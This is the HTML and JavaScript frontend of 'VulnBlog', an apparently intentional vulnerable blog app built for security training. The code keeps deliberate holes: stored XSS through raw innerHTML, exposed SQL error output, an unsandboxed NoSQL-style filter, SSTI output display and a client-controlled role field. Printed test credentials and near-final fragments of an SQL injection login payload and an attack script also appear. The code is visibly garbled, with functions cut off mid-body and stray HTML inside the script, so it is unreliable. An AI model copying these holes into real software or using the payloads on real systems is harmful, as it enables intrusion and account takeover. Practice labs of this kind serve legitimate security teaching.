<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>VulnBlog</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Source+Serif+4:opsz,wght@8..60,300;8..60,400;8..60,600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/protobufjs@7.3.0/dist/protobuf.min.js"></script>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --ink:#1a1208;--paper:#f5f0e8;--cream:#ede8dc;--rust:#b83232;
  --rust-dark:#8c1f1f;--gold:#9a7415;--muted:#6b5f4e;--border:#c8bfad;
  --dark:#111009;--code-bg:#1a120a;--success:#2d6a4f;
  --mono:'JetBrains Mono',monospace;--serif:'Playfair Display',serif;
  --body:'Source Serif 4',serif;
}
html{font-size:17px;scroll-behavior:smooth}
body{background:var(--paper);color:var(--ink);font-family:var(--body);font-weight:300;line-height:1.75;min-height:100vh}
.warn-bar{background:#7c1d1d;color:#fef3c7;text-align:center;padding:.4rem 1rem;font-family:var(--mono);font-size:.58rem;letter-spacing:.07em;position:sticky;top:0;z-index:100}
.masthead{background:var(--cream);border-bottom:3px double var(--border);padding:2.2rem 1rem 1.8rem;text-align:center}
.masthead-date{font-family:var(--mono);font-size:.58rem;letter-spacing:.18em;color:var(--muted);text-transform:uppercase;margin-bottom:.6rem}
.masthead h1{font-family:var(--serif);font-size:clamp(2.8rem,6vw,5rem);font-weight:700;letter-spacing:-.02em;line-height:1;cursor:pointer;display:inline-block}
.masthead h1 em{color:var(--rust);font-style:italic}
.masthead-sub{font-size:.68rem;letter-spacing:.22em;color:var(--muted);text-transform:uppercase;margin-top:.5rem}
nav{background:var(--dark);border-bottom:2px solid var(--rust);position:sticky;top:2.1rem;z-index:90}
.nav-inner{max-width:1080px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:0 1.5rem}
.nav-links{display:flex}
.nav-links a,.nav-btn{display:block;padding:.6rem 1.1rem;color:#c8bfad;text-decoration:none;font-family:var(--mono);font-size:.62rem;letter-spacing:.1em;text-transform:uppercase;transition:background .15s,color .15s;background:none;border:none;cursor:pointer}
.nav-links a:hover,.nav-btn:hover{background:var(--rust);color:#fff}
.nav-user{display:flex;align-items:center;gap:.5rem}
.nav-user-name{font-family:var(--mono);font-size:.6rem;color:#9a8060;letter-spacing:.07em}
.nav-badge{font-family:var(--mono);font-size:.5rem;background:var(--rust);color:#fff;padding:.1rem .35rem;border-radius:2px;text-transform:uppercase;letter-spacing:.05em}
.nav-badge.admin{background:#7c2d12}.nav-badge.author{background:#1a4731}
.page{max-width:1080px;margin:0 auto;padding:2.5rem 1.5rem;display:grid;grid-template-columns:1fr 280px;gap:3rem}
@media(max-width:700px){.page{grid-template-columns:1fr;padding:1.5rem 1rem}}
.page.full{grid-template-columns:1fr}
.rule{display:flex;align-items:center;gap:1rem;margin-bottom:2rem}
.rule span{font-family:var(--serif);font-size:1.25rem;font-style:italic;white-space:nowrap}
.rule::before,.rule::after{content:'';flex:1;height:1px;background:var(--border)}
.card{border-bottom:1px solid var(--border);padding-bottom:2.2rem;margin-bottom:2.2rem}
.card:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0}
.card-meta{font-family:var(--mono);font-size:.57rem;color:var(--muted);letter-spacing:.08em;text-transform:uppercase;margin-bottom:.5rem;display:flex;gap:1rem;flex-wrap:wrap;align-items:center}
.card-meta .draft-badge{background:#7c2d12;color:#fde8e8;padding:.1rem .4rem;border-radius:2px;font-size:.5rem}
.card h2{font-family:var(--serif);font-size:1.65rem;font-weight:700;line-height:1.2;margin-bottom:.6rem}
.card h2 a{color:var(--ink);text-decoration:none;cursor:pointer}
.card h2 a:hover{color:var(--rust)}
.card-excerpt{color:var(--muted);font-size:.88rem;line-height:1.7;margin-bottom:.85rem;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
.readmore{font-family:var(--mono);font-size:.58rem;letter-spacing:.08em;color:var(--rust);cursor:pointer;text-transform:uppercase;border-bottom:1px solid currentColor;padding-bottom:1px;background:none;border-top:none;border-left:none;border-right:none}
.tags{display:flex;gap:.3rem;flex-wrap:wrap;margin-top:.65rem}
.tag{font-family:var(--mono);font-size:.52rem;background:var(--cream);border:1px solid var(--border);padding:.13rem .42rem;border-radius:2px;color:var(--muted)}
.post-header h1{font-family:var(--serif);font-size:clamp(1.8rem,4vw,2.9rem);font-weight:700;line-height:1.15;margin-bottom:.75rem}
.post-body{font-size:.98rem;line-height:1.9;margin:1.75rem 0}
.post-body p{margin-bottom:1.1rem}
.post-body strong{font-weight:600}
.post-body code{font-family:var(--mono);font-size:.8rem;background:var(--cream);padding:.1rem .35rem;border-radius:2px}
.comments-section{margin-top:2.5rem;border-top:2px solid var(--border);padding-top:1.75rem}
.comments-section h3{font-family:var(--serif);font-size:1.2rem;font-style:italic;margin-bottom:1.25rem}
.comment-card{border-left:3px solid var(--border);padding:.65rem 1rem;margin-bottom:.9rem;background:var(--cream)}
.comment-card:hover{border-left-color:var(--rust)}
.comment-by{font-family:var(--mono);font-size:.57rem;color:var(--muted);margin-bottom:.3rem}
.comment-body{font-size:.88rem;line-height:1.65}
aside{border-left:1px solid var(--border);padding-left:2rem}
.widget{margin-bottom:2rem}
.widget-title{font-family:var(--mono);font-size:.57rem;letter-spacing:.13em;text-transform:uppercase;color:var(--muted);border-bottom:1px solid var(--border);padding-bottom:.4rem;margin-bottom:.8rem}
.widget ul{list-style:none}
.widget li{padding:.28rem 0;border-bottom:1px dashed var(--border);font-size:.82rem}
.widget li:last-child{border:none}
.widget a{color:var(--ink);text-decoration:none;cursor:pointer}
.widget a:hover{color:var(--rust)}
.proto-box{background:var(--code-bg);border:1px solid #3a2510;border-radius:3px;padding:1.1rem;margin-bottom:1.5rem}
.proto-box-title{font-family:var(--mono);font-size:.58rem;color:#c8922a;letter-spacing:.1em;text-transform:uppercase;margin-bottom:.55rem}
.proto-box p{font-family:var(--mono);font-size:.6rem;color:#7a6040;line-height:1.65;margin-bottom:.65rem}
.proto-box code{color:#c8922a}
.btn-dl{display:inline-block;background:var(--rust);color:#fff;padding:.32rem .8rem;font-family:var(--mono);font-size:.6rem;letter-spacing:.06em;text-decoration:none;border-radius:2px;border:none;cursor:pointer}
.btn-dl:hover{background:var(--rust-dark)}
.form-wrap{background:var(--cream);border:1px solid var(--border);border-radius:3px;padding:1.75rem;max-width:560px}
.form-wrap h2{font-family:var(--serif);font-size:1.5rem;margin-bottom:1.25rem}
.form-group{margin-bottom:1rem}
.form-group label{display:block;font-family:var(--mono);font-size:.6rem;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);margin-bottom:.35rem}
.form-group input,.form-group textarea,.form-group select{width:100%;background:var(--paper);border:1px solid var(--border);color:var(--ink);font-family:var(--body);font-size:.88rem;padding:.5rem .75rem;border-radius:2px;outline:none;transition:border-color .15s}
.form-group input:focus,.form-group textarea:focus{border-color:var(--rust)}
.form-group textarea{resize:vertical;min-height:120px;line-height:1.6}
.form-row{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
.form-check{display:flex;align-items:center;gap:.5rem;font-size:.85rem;color:var(--muted)}
.form-check input{width:auto}
.btn{display:inline-block;padding:.5rem 1.2rem;font-family:var(--mono);font-size:.65rem;letter-spacing:.08em;text-transform:uppercase;border:none;border-radius:2px;cursor:pointer;transition:background .15s,opacity .15s}
.btn-primary{background:var(--rust);color:#fff}
.btn-primary:hover{background:var(--rust-dark)}
.btn-secondary{background:var(--cream);color:var(--ink);border:1px solid var(--border)}
.btn-secondary:hover{background:var(--border)}
.btn-ghost{background:none;color:var(--rust);border:1px solid var(--rust)}
.btn-ghost:hover{background:var(--rust);color:#fff}
.btn:disabled{opacity:.5;cursor:not-allowed}
.form-link{font-family:var(--mono);font-size:.6rem;color:var(--rust);cursor:pointer;background:none;border:none;text-decoration:underline;padding:0}
.form-actions{display:flex;align-items:center;gap:1rem;flex-wrap:wrap;margin-top:.25rem}
.alert{padding:.65rem 1rem;border-radius:2px;font-family:var(--mono);font-size:.65rem;letter-spacing:.04em;margin-bottom:1rem;line-height:1.5;word-break:break-word}
.alert-error{background:#fde8e8;border-left:3px solid var(--rust);color:#7c1d1d}
.alert-success{background:#d1fae5;border-left:3px solid var(--success);color:#065f46}
.alert-info{background:#fef3c7;border-left:3px solid var(--gold);color:#78350f}
.spinner{display:inline-block;width:14px;height:14px;border:2px solid var(--border);border-top-color:var(--rust);border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle;margin-right:.4rem}
@keyframes spin{to{transform:rotate(360deg)}}
.loading-msg{font-family:var(--mono);font-size:.7rem;color:var(--muted);padding:2rem 0;text-align:center}
.modal-overlay{position:fixed;inset:0;background:rgba(17,16,9,.7);z-index:200;display:flex;align-items:center;justify-content:center;padding:1rem;backdrop-filter:blur(2px)}
.modal{background:var(--paper);border:1px solid var(--border);border-radius:4px;max-width:500px;width:100%;max-height:90vh;overflow-y:auto;padding:2rem;position:relative}
.modal-close{position:absolute;top:.75rem;right:.75rem;background:none;border:none;font-size:1.1rem;cursor:pointer;color:var(--muted)}
.modal-close:hover{color:var(--rust)}
.tab-row{display:flex;border-bottom:1px solid var(--border);margin-bottom:1.5rem}
.tab{font-family:var(--mono);font-size:.62rem;letter-spacing:.08em;text-transform:uppercase;padding:.5rem 1rem;cursor:pointer;background:none;border:none;color:var(--muted);border-bottom:2px solid transparent;margin-bottom:-1px;transition:color .15s}
.tab.active{color:var(--rust);border-bottom-color:var(--rust)}
.empty{text-align:center;padding:3rem 1rem;color:var(--muted);font-size:.9rem}
.empty-icon{font-size:2.5rem;margin-bottom:.75rem;opacity:.4}
.profile-header{display:flex;align-items:center;gap:1.5rem;margin-bottom:2rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border)}
.avatar{width:64px;height:64px;border-radius:50%;background:var(--rust);display:flex;align-items:center;justify-content:center;font-family:var(--serif);font-size:1.6rem;font-style:italic;color:#fff;flex-shrink:0}
.profile-name{font-family:var(--serif);font-size:1.75rem;font-weight:700}
.profile-role{font-family:var(--mono);font-size:.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;margin-top:.2rem}
.search-bar{display:flex;gap:.5rem;margin-bottom:1.5rem}
.search-bar input{flex:1;background:var(--cream);border:1px solid var(--border);color:var(--ink);font-family:var(--body);font-size:.85rem;padding:.45rem .75rem;border-radius:2px;outline:none}
.search-bar input:focus{border-color:var(--rust)}
.search-bar button{background:var(--rust);color:#fff;border:none;padding:.45rem 1rem;font-family:var(--mono);font-size:.62rem;letter-spacing:.07em;border-radius:2px;cursor:pointer}
.apidoc h2{font-family:var(--serif);font-size:1.5rem;margin:1.75rem 0 .65rem}
.apidoc h3{font-family:var(--mono);font-size:.68rem;color:var(--rust);margin:1.25rem 0 .45rem;text-transform:uppercase;letter-spacing:.1em}
.apidoc p{font-size:.9rem;margin-bottom:.75rem;line-height:1.75}
.apidoc pre{background:var(--code-bg);color:#c8a96a;padding:.9rem 1.1rem;font-family:var(--mono);font-size:.62rem;line-height:1.7;overflow-x:auto;border-radius:3px;margin:.65rem 0}
.apidoc table{width:100%;border-collapse:collapse;font-size:.8rem;margin:.65rem 0}
.apidoc th{background:var(--dark);color:var(--cream);font-family:var(--mono);font-size:.58rem;text-align:left;padding:.45rem .75rem;letter-spacing:.07em}
.apidoc td{padding:.42rem .75rem;border-bottom:1px solid var(--border);vertical-align:top}
.apidoc td:first-child{font-family:var(--mono);font-size:.62rem;color:var(--rust)}
.vuln-badge{display:inline-block;background:var(--rust);color:#fff;font-family:var(--mono);font-size:.5rem;padding:.08rem .35rem;border-radius:2px;margin:.1rem;vertical-align:middle;letter-spacing:.04em}
footer{margin-top:4rem;border-top:3px double var(--border);background:var(--dark);text-align:center;padding:1.75rem 1rem}
footer p{font-family:var(--mono);font-size:.58rem;color:#4a3f30;line-height:2}
footer a{color:var(--gold);text-decoration:none}
</style>
</head>
<body>


<header class="masthead">
  <div class="masthead-date" id="masthead-date"></div>
  <h1 onclick="navigate('home')">Vuln<em>Blog</em></h1>
  <div class="masthead-sub">Ideas · Technology · Security</div>
</header>

<nav>
  <div class="nav-inner">
    <div class="nav-links">
      <a onclick="navigate('home')">Home</a>
      <a onclick="navigate('apidocs')">API Docs</a>
      <a href="/blog.proto">⬡ .proto</a>
    </div>
    <div class="nav-user" id="nav-user">
      <button class="nav-btn" onclick="showAuthModal()">Login / Register</button>
    </div>
  </div>
</nav>

<!-- Auth modal -->
<div class="modal-overlay" id="auth-modal" style="display:none">
  <div class="modal">
    <button class="modal-close" onclick="closeAuthModal()">✕</button>
    <div class="tab-row">
      <button class="tab active" id="tab-login" onclick="switchTab('login')">Login</button>
      <button class="tab" id="tab-register" onclick="switchTab('register')">Register</button>
    </div>
    <div id="auth-alert"></div>
    <div id="form-login">
      <div class="form-group">
        <label>Username</label>
        <input id="login-username" type="text" placeholder="e.g. alice" autocomplete="username">
      </div>
      <div class="form-group">
        <label>Password</label>
        <input id="login-password" type="password" placeholder="••••••••" autocomplete="current-password"
          onkeydown="if(event.key==='Enter')doLogin()">
      </div>
      <div class="form-actions">
        <button class="btn btn-primary" id="btn-login" onclick="doLogin()">Sign In</button>
        <span style="font-family:var(--mono);font-size:.55rem;color:var(--muted)">alice/alice123 · admin/s3cr3tAdm1n!</span>
      </div>
    </div>
    <div id="form-register" style="display:none">
      <div class="form-group">
        <label>Username</label>
        <input id="reg-username" type="text" placeholder="Choose a username" autocomplete="username">
      </div>
      <div class="form-group">
        <label>Email</label>
        <input id="reg-email" type="email" placeholder="you@example.com">
      </div>
      <div class="form-group">
        <label>Password</label>
        <input id="reg-password" type="password" placeholder="••••••••" autocomplete="new-password"
          onkeydown="if(event.key==='Enter')doRegister()">
      </div>
      <button class="btn btn-primary" id="btn-register" onclick="doRegister()">Create Account</button>
    </div>
  </div>
</div>

<div id="app"></div>

<footer>
  <p>© <span id="footer-year"></span> VulnBlog &nbsp;·&nbsp; Protobuf API: <code style="color:var(--gold)">POST /api/proto</code> &nbsp;·&nbsp; <a href="/blog.proto">Download Schema</a></p>
  <p>All requests carry a session_token field in the Protobuf message. Built for security research.</p>
</footer>

<script>
// ════════════════════════════════════════════════════════════════════
//  VulnBlog Frontend — All requests use binary Protobuf + session token
// ════════════════════════════════════════════════════════════════════

// ── Session state (in-memory — token never stored in localStorage) ────────────
const session = {
  token: null,   // opaque hex string from server sessions table
  user:  null,   // { id, username, email, role, bio }
};

// ── Protobuf schema (inline — mirrors blog.proto exactly) ─────────────────────
const PROTO_DEF = `
syntax = "proto3";
package blog;
enum Role { GUEST=0; AUTHOR=1; ADMIN=2; }
message Author { int32 id=1; string username=2; string email=3; Role role=4; string bio=5; }
message Post { int32 id=1; string title=2; string body=3; string category=4; string template=5;
  int32 author_id=6; string tags=7; bool published=8; string author_name=9; string created=10; }
message Comment { int32 id=1; int32 post_id=2; string author=3; string content=4; string filter=5; string created=6; }
message LoginRequest { string username=1; string password=2; }
message RegisterRequest { string username=1; string password=2; string email=3; }
message ListPostsRequest { Role min_role=1; string category=2; string session_token=3; }
message GetPostRequest { int32 post_id=1; string session_token=2; }
message SearchRequest { string query=1; string tags=2; Role min_role=3; string session_token=4; }
message CreatePostRequest { string session_token=1; Post post=2; }
message CreateCommentRequest { string session_token=1; Comment comment=2; }
message FilterCommentsRequest { int32 post_id=1; string filter=2; string session_token=3; }
message UpdateProfileRequest { string session_token=1; Author author=2; }
message LoginResponse { bool success=1; string session_token=2; Author user=3; }
message SearchResponse { repeated Post posts=1; int32 total=2; string debug=3; }
message LogoutRequest { string session_token=1; }
message PublishPostRequest { string session_token=1; int32 post_id=2; }
message DeletePostRequest { string session_token=1; int32 post_id=2; }
message ApiRequest {
  oneof payload {
    LoginRequest login=1; CreatePostRequest post=2; CreateCommentRequest comment=3;
    SearchRequest search=4; UpdateProfileRequest profile=5; RegisterRequest register=6;
    ListPostsRequest listPosts=7; GetPostRequest getPost=8; FilterCommentsRequest filterComments=9;
    LogoutRequest logout=10; PublishPostRequest publishPost=11; DeletePostRequest deletePost=12;
  }
}
message ApiResponse {
  bool success=1; string message=2;
  oneof result { LoginResponse login_result=3; Post post_result=4; SearchResponse search_result=5; Comment comment_result=6; }
  repeated Comment comment_list=7;
}
`;

let ApiRequest, ApiResponse;

async function initProto() {
  const root  = protobuf.parse(PROTO_DEF, { keepCase: false }).root;
  ApiRequest  = root.lookupType('blog.ApiRequest');
  ApiResponse = root.lookupType('blog.ApiResponse');
  console.log('[VulnBlog] Proto ready. Session token will be sent on every authenticated request.');
}


// Simpler helper that always injects session token by field name inspection
async function api(payloadKey, payload = {}) {
  // Inject the session token into every request that has a sessionToken field.
  // The proto schema defines session_token on all authenticated message types.
  // protobufjs silently ignores fields that don't exist on the target message
  // (e.g. login / register have no session_token field), so this is safe to
  // set unconditionally.
  if (session.token) payload.sessionToken = session.token;

  const msg  = ApiRequest.create({ [payloadKey]: payload });
  const buf  = ApiRequest.encode(msg).finish();
  const resp = await fetch('/api/proto', {
    method:  'POST',
    headers: { 'Content-Type': 'application/x-protobuf' },
    body:    buf
  });

  if (!resp.ok && resp.headers.get('content-type')?.includes('json')) {
    const e = await resp.json();
    throw new Error(e.error || 'HTTP ' + resp.status);
  }

  const bytes = new Uint8Array(await resp.arrayBuffer());
  return ApiResponse.decode(bytes);
}


// ── Session management ────────────────────────────────────────────────────────
function setSession(token, user) {
  session.token = token;
  session.user  = user;
  // Persist across page refreshes via sessionStorage (not localStorage — clears on tab close)
  try {
    sessionStorage.setItem('vb_token', token);
    sessionStorage.setItem('vb_user',  JSON.stringify(user));
  } catch(e) {}
  renderNavUser();
}

function clearSession() {
  session.token = null;
  session.user  = null;
  try { sessionStorage.removeItem('vb_token'); sessionStorage.removeItem('vb_user'); } catch(e) {}
  renderNavUser();
}

function loadSession() {
  try {
    const t = sessionStorage.getItem('vb_token');
    const u = sessionStorage.getItem('vb_user');
    if (t && u) {
      session.token = t;
      session.user  = JSON.parse(u);
      renderNavUser();
    }
  } catch(e) {}
}

// ── Router ────────────────────────────────────────────────────────────────────
const state = { route: 'home', postId: null };

function navigate(route, id) {
  state.route  = route;
  if (id !== undefined) state.postId = id;
  window.scrollTo(0, 0);
  render();
}

function render() {
  const app = document.getElementById('app');
  switch (state.route) {
    case 'home':     renderHome(app);    break;
    case 'post':     renderPost(app);    break;
    case 'new-post': renderNewPost(app); break;
    case 'profile':  renderProfile(app); break;
    case 'apidocs':  renderApiDocs(app); break;
    default:         renderHome(app);
  }
}

// ── Helpers ───────────────────────────────────────────────────────────────────
function esc(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
function tagSpans(t) { return (t||'').split(',').filter(Boolean).map(s=>`<span class="tag">${esc(s.trim())}</span>`).join(''); }
function excerpt(html) { return html.replace(/<[^>]+>/g,'').slice(0,185)+'…'; }
function setAlert(id, msg, type='error') {
  const el = document.getElementById(id);
  if (el) el.innerHTML = msg ? `<div class="alert alert-${type}">${esc(msg)}</div>` : '';
}
function roleName(r)  { return ['Guest','Author','Admin'][r] || 'Guest'; }
function roleClass(r) { return ['','author','admin'][r] || ''; }

let homeCache = [];

function renderNavUser() {
  const el = document.getElementById('nav-user');
  if (!el) return;
  if (session.user) {
    el.innerHTML = `

async function loadPosts(category) {
  const minRole = session.user?.role >= 2 ? 2 : 0;
  let result;
  try {
    result = await api('listPosts', { minRole, category: category || '' });
  } catch(e) {
    document.getElementById('post-list').innerHTML = `<div class="alert alert-error">Failed to load: ${esc(e.message)}</div>`;
    return;
  }
  homeCache = result.searchResult?.posts || [];
  renderPostList(homeCache);
  // Rebuild sidebar with real post list
  const aside = document.querySelector('aside');
  if (aside) { const tmp = document.createElement('div'); tmp.innerHTML = sidebar(homeCache); aside.replaceWith(tmp.firstElementChild); }
}

function renderPostList(posts) {
  const el = document.getElementById('post-list');
  if (!el) return;
  if (!posts.length) { el.innerHTML = `<div class="empty"><div class="empty-icon">✍</div><p>No posts found.</p></div>`; return; }
  el.innerHTML = posts.map(p => `
  <article class="card">
    <div class="card-meta">
      <span>By ${esc(p.authorName||'unknown')}</span>
      <span>${esc(p.created||'')}</span>
      <span>${esc(p.category||'')}</span>
      ${!p.published ? '<span class="draft-badge">Draft</span>' : ''}
    </div>
    <h2><a onclick="navigate('post',${p.id})">${esc(p.title)}</a></h2>
    <p class="card-excerpt">${esc(excerpt(p.body))}</p>

    <div class="tags">${tagSpans(p.tags)}</div>
  </article>`).join('');
}

async function doSearch() {
  const q    = document.getElementById('search-input')?.value.trim() || '';
  const tags = document.getElementById('tags-input')?.value.trim() || '';
  if (!q && !tags) { renderPostList(homeCache); setAlert('home-alert',''); return; }
  let result;
  try { result = await api('search', { query: q, tags, minRole: session.user?.role >= 2 ? 2 : 0 }); }
  catch(e) { setAlert('home-alert', e.message); return; }

  const alertEl = document.getElementById('home-alert');
  if (!alertEl) return;

  // Error path — show the SQL error message (contains injected data for error-based SQLi)
  if (!result.success) {
    const debug = result.searchResult?.debug || '';
    alertEl.innerHTML =
      `<div class="alert alert-error" style="font-family:var(--mono);font-size:.65rem;word-break:break-all;line-height:1.7">
        <strong>SQL Error:</strong> ${esc(result.message.replace('SQL Error: ',''))}<br>
        ${debug ? `<span style="opacity:.7"><strong>Query:</strong> ${esc(debug)}</span>` : ''}
      </div>`;
    renderPostList([]);
    return;
  }

  // Success path — show posts and debug SQL
  const posts = result.searchResult?.posts || [];
  const debug = result.searchResult?.debug || '';
  if (debug) {
    alertEl.innerHTML = `<div class="alert alert-info" style="font-family:var(--mono);font-size:.6rem;word-break:break-all;line-height:1.6"><strong>SQL:</strong> ${esc(debug)}</div>`;
  } else if (!posts.length) {
    alertEl.innerHTML = `<div class="alert alert-info">No results</div>`;
  } else {
    alertEl.innerHTML = '';
  }
  renderPostList(posts);
}

async function doPublishPost(postId) {

}

async function doDeletePost(postId) {
  if (!confirm('Permanently delete this post and all its comments? This cannot be undone.')) return;
  let result;
  try { result = await api('deletePost', { postId }); }
  catch(e) { alert('Error: ' + e.message); return; }

// ── Filter comments (NoSQL injection surface) ─────────────────────────────────
async function doFilterComments(postId) {
  const expr   = document.getElementById('filter-expr')?.value || '';
  const infoEl = document.getElementById('filter-result-info');

  let result;
  try { result = await api('filterComments', { postId, filter: expr }); }
  catch(e) { if (infoEl) infoEl.textContent = 'Error: ' + e.message; return; }

  const list = document.getElementById('comments-list');
  if (!list) return;

  if (!result.success) {
    if (infoEl) infoEl.innerHTML = `<span style="color:var(--rust)">${esc(result.message)}</span>`;
    return;
  }

  const comments = result.commentList || [];
  if (infoEl) infoEl.innerHTML = expr
    ? `<span style="color:var(--success)">✓ ${esc(result.message)}</span>`
    : `<span>${comments.length} comment(s)</span>`;

  const countEl = document.getElementById('comment-count');
  if (countEl && !expr) countEl.textContent = comments.length;

  if (!comments.length) {
    list.innerHTML = `<p style="color:var(--muted);font-size:.85rem;padding:.5rem 0">No comments match this filter.</p>`;
    return;
  }
  // VULN: comment content rendered as raw innerHTML → Stored XSS
  list.innerHTML = comments.map(c => `
    <div class="comment-card">
      <div class="comment-by">${esc(c.author)} · ${esc(c.created)}</div>
      <div class="comment-body">${c.content}</div>
    </div>`).join('');
}

function applyPreset(postId, expr) {
  const input = document.getElementById('filter-expr');
  if (input) { input.value = expr; input.focus(); }
  doFilterComments(postId);
}

// ── Post comment ──────────────────────────────────────────────────────────────
async function doComment(postId) {
  const content = document.getElementById('comment-content')?.value.trim();
  if (!content) { setAlert('comment-alert','Response cannot be empty.'); return; }
  if (!session.token) { setAlert('comment-alert','You must be logged in to comment.'); return; }

  const btn = document.getElementById('btn-comment');
  btn.disabled = true; btn.innerHTML = '<span class="spinner"></span>Posting…';

  let result;
  try {
    // session_token sent inside CreateCommentRequest.session_token
    result = await api('comment', { comment: { postId, content, filter: '' } });
  } catch(e) { setAlert('comment-alert', e.message); btn.disabled=false; btn.textContent='Post Response'; return; }

  if (!result.success) {
    setAlert('comment-alert', result.message);
    btn.disabled=false; btn.textContent='Post Response'; return;
  }

  document.getElementById('comment-content').value = '';
  btn.disabled=false; btn.textContent='Post Response';
  setAlert('comment-alert','');
  doFilterComments(postId);
}

async function doCreatePost() {
  const title     = document.getElementById('post-title').value.trim();
  const body      = document.getElementById('post-body').value.trim();
  const category  = document.getElementById('post-category').value.trim() || 'General';
  const tags      = document.getElementById('post-tags').value.trim();
  const template  = document.getElementById('post-template').value.trim();
  const published = document.getElementById('post-published').checked;

  if (!title || !body) { setAlert('newpost-alert','Title and body are required.'); return; }
  if (!session.token)  { setAlert('newpost-alert','You must be logged in.'); return; }

  const btn = document.getElementById('btn-post');
  btn.disabled=true; btn.innerHTML='<span class="spinner"></span>Publishing…';

  let result;
  try {
    // session_token inside CreatePostRequest — server uses it to identify the author
    result = await api('post', { post: { title, body, category, template, tags, published, authorId: session.user.id } });
  } catch(e) { setAlert('newpost-alert', e.message); btn.disabled=false; btn.textContent='Publish Post'; return; }

  if (!result.success) {
    setAlert('newpost-alert', result.message);
    btn.disabled=false; btn.textContent='Publish Post'; return;
  }

  btn.disabled=false; btn.textContent='Publish Post';
  const postId = result.postResult?.id;
  const msg    = result.message || '';

  const alertEl = document.getElementById('newpost-alert');
  if (alertEl && msg && msg !== 'Post created') {
    var out = '<div class="alert alert-info" style="font-family:var(--mono);font-size:.7rem;line-height:1.8">';
    out += '<strong style="color:var(--rust)">SSTI rendered output:</strong><br>';
    out += '<pre style="background:#1a120a;color:#c8922a;padding:.75rem;border-radius:3px;margin:.4rem 0;white-space:pre-wrap;font-size:.65rem;max-height:200px;overflow:auto">' + esc(msg) + '</pre>';
    out += '<span style="opacity:.7;margin-top:.5rem;display:block">Navigating in 5s...</span>';
    out += '</div>';
    alertEl.innerHTML = out;
    setTimeout(function() { navigate('post', postId); }, 5000);
  } else {
    setTimeout(function() { navigate('post', postId); }, 800);
  }
}

        </small>

async function doUpdateProfile() {
  if (!session.token) { setAlert('profile-alert','You must be logged in.'); return; }
  const bio   = document.getElementById('prof-bio').value.trim();
  const email = document.getElementById('prof-email').value.trim();
  const role  = parseInt(document.getElementById('prof-role-actual').value, 10) || 0;  // UI sends current role; intercept proto to change it

  const btn = document.getElementById('btn-profile');
  btn.disabled=true; btn.innerHTML='<span class="spinner"></span>Saving…';

  let result;
  try {
    // session_token inside UpdateProfileRequest
    result = await api('profile', { author: { id: session.user.id, username: session.user.username, email, bio, role } });
  } catch(e) { setAlert('profile-alert', e.message); btn.disabled=false; btn.textContent='Save Changes'; return; }

  if (!result.success) {
    setAlert('profile-alert', result.message);
    btn.disabled=false; btn.textContent='Save Changes'; return;
  }

  // Server returns a fresh token + updated user after profile save
  const lr = result.loginResult;
  if (lr?.sessionToken && lr?.user) setSession(lr.sessionToken, lr.user);

  setAlert('profile-alert', result.message || 'Profile updated.', 'success');
  btn.disabled=false; btn.textContent='Save Changes';
  setTimeout(() => renderProfile(document.getElementById('app')), 300);
}

// ── Auth ──────────────────────────────────────────────────────────────────────
function showAuthModal()  { document.getElementById('auth-modal').style.display='flex'; }
function closeAuthModal() { document.getElementById('auth-modal').style.display='none'; setAlert('auth-alert',''); }
function switchTab(t) {
  document.getElementById('form-login').style.display    = t==='login'    ? '' : 'none';
  document.getElementById('form-register').style.display = t==='register' ? '' : 'none';
  document.getElementById('tab-login').className    = 'tab'+(t==='login'   ?' active':'');
  document.getElementById('tab-register').className = 'tab'+(t==='register'?' active':'');
  setAlert('auth-alert','');
}

async function doLogin() {
  const username = document.getElementById('login-username').value.trim();
  const password = document.getElementById('login-password').value;
  if (!username||!password) { setAlert('auth-alert','Enter username and password.'); return; }

  const btn = document.getElementById('btn-login');
  btn.disabled=true; btn.innerHTML='<span class="spinner"></span>Signing in…';

  let result;
  try { result = await api('login', { username, password }); }
  catch(e) { setAlert('auth-alert', e.message); btn.disabled=false; btn.textContent='Sign In'; return; }

  if (!result.success || !result.loginResult?.success) {
    setAlert('auth-alert', result.message || 'Login failed.');
    btn.disabled=false; btn.textContent='Sign In'; return;
  }

  const lr = result.loginResult;
  setSession(lr.sessionToken, lr.user);
  closeAuthModal();
  navigate('home');
}

async function doRegister() {
  const username = document.getElementById('reg-username').value.trim();
  const email    = document.getElementById('reg-email').value.trim();
  const password = document.getElementById('reg-password').value;
  if (!username||!password) { setAlert('auth-alert','Username and password are required.'); return; }

  const btn = document.getElementById('btn-register');
  btn.disabled=true; btn.innerHTML='<span class="spinner"></span>Creating account…';

  let result;
  try { result = await api('register', { username, password, email }); }
  catch(e) { setAlert('auth-alert', e.message); btn.disabled=false; btn.textContent='Create Account'; return; }

  if (!result.success) {
    setAlert('auth-alert', result.message || 'Registration failed.');
    btn.disabled=false; btn.textContent='Create Account'; return;
  }

  const lr = result.loginResult;
  setSession(lr.sessionToken, lr.user);
  closeAuthModal();
  navigate('home');
}

async function doLogout() {
  // Send a proper LogoutRequest — server deletes the session row from the DB
  try { await api('logout', { sessionToken: session.token }); } catch(e) {}
  clearSession();
  navigate('home');
}

    <h3>Vulnerability Map</h3>

      <tr><td>filter</td><td>FilterCommentsRequest</td><td><span class="vuln-badge">NoSQLi</span> fn.call(row) — no sandbox, mirrors MongoDB $where</td></tr>

    <pre>LoginRequest.username = "admin'--"
LoginRequest.password = "anything"
# SQL: SELECT * FROM users WHERE username = 'admin'--' AND ...</pre>

    <h3>[2] SQLi — UNION Dump (tag)</h3>

from blog_pb2 import ApiRequest, ApiResponse
import requests

BASE = "http://localhost:3000"

def call(req):
